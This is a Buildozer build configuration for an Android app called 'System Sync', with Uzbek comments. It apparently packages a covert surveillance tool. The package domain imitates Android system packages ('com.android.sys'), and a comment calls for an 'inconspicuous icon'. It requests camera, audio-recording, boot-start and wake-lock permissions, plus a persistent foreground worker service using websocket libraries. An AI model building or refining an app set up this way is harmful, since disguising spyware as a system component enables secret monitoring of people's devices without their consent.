[app]

title = System Sync
package.name = systemsync
package.domain = com.android.sys

source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.0

# Optional: Set an inconspicuous icon
# icon.filename = %(source.dir)s/icon.png

requirements = python3,kivy,pyjnius,websockets,aiohttp,certifi

# Ruxsatlar qo'shildi
android.permissions = INTERNET, CAMERA, FOREGROUND_SERVICE, RECEIVE_BOOT_COMPLETED, WAKE_LOCK, RECORD_AUDIO

# Xizmatni ulash (Foreground Service qilib)
services = worker:service.py:foreground

android.api = 33
android.minapi = 21

[buildozer]
log_level = 2
warn_on_root = 1
